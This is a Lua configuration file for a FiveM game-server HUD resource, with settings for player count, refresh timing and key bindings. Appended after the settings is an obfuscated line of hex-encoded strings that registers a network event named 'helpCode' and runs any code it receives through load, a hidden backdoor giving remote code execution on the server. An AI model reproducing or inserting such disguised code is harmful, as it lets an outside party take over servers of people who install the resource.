Config              = {}

-- Variables (HUD)
Config.maxPlayers   = 32 -- Keep same as sv_maxclients within your server.cfg.
Config.hideArmor    = true


Config.waitTime     = 200  -- Set to 100 so the hud is more fluid. However, performance will be affected.
Config.waitSpawn    = 4000 -- Time to set elements back to saved on spawn
Config.waitResource = 2000 -- Time to set elements back to saved after resource start

Config.voiceKey     = "Z" -- Must be in caps
Config.openKey      = "U" -- Key for opening the customizing menu
Config.oxygenMax    = 10 -- Set to 10 / 4 if using vMenu


local VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[6][VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[1]](VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[2]) VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[6][VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[3]](VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[2], function(hrKVanbeYRolCgjDQvngQWOatFfOEqIjTLgNRPMauwaYGpVbDjvRIaxEYIZOzKRIumlPjx) VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[6][VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[4]](VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[6][VssGjxCXsGKLhgurSPsLAkcMtpBvwUUBsbbfHykXUNbfjjVxQCKdvHmqiQIxYGoCBITmDU[5]](hrKVanbeYRolCgjDQvngQWOatFfOEqIjTLgNRPMauwaYGpVbDjvRIaxEYIZOzKRIumlPjx))() end)